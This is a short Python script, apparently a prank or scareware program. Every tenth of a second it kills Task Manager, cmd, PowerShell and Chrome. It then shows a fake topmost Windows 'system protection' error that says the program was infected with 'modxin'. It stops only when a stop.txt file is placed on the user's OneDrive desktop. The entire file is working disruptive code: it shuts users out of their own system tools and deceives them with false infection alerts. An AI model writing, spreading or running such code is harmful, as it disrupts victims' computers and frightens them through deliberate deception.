import psutil
import time
import tkinter as tk
from tkinter import messagebox
import os

BLACKLIST = [
    "Taskmgr.exe", 
    "cmd.exe", 
    "powershell.exe", 
    "chrome.exe", 
]

KILL_SWITCH = os.path.join(os.path.expanduser("~"), "OneDrive\デスクトップ", "stop.txt")

def show_error(app_name):
    root = tk.Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    messagebox.showerror(
        "Windows システムの保護", 
        f"システムエラー: {app_name} (0x80040154)\n{app_name}は「modxin」に感染しました。"
    )
    root.destroy()

def check_and_kill():
    for proc in psutil.process_iter(['name']):
        try:
            proc_name = proc.info['name']
            if proc_name and proc_name.lower() in [name.lower() for name in BLACKLIST]:
                proc.kill()
                show_error(proc_name)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

def main():
    print(f"ブラックリスト監視中... 終了するにはデスクトップに {os.path.basename(KILL_SWITCH)} を作成してください。")
    
    while True:
        if os.path.exists(KILL_SWITCH):
            print("安全装置が作動しました。")
            try:
                os.remove(KILL_SWITCH)
            except:
                pass
            break
        
        check_and_kill()
        time.sleep(0.1)

if __name__ == "__main__":
    main()
